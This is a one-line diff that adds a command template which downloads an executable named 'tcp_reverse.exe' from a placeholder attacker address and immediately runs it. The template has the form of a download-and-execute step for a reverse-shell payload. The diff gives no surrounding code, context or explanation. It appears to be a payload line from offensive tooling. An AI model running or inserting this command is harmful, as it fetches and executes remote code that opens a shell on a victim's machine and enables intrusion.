@@ -1,0 +1,1 @@
+wget http://{ip_attacker}/tcp_reverse.exe -OutFile tcp_reverse.exe; .\tcp_reverse.exe
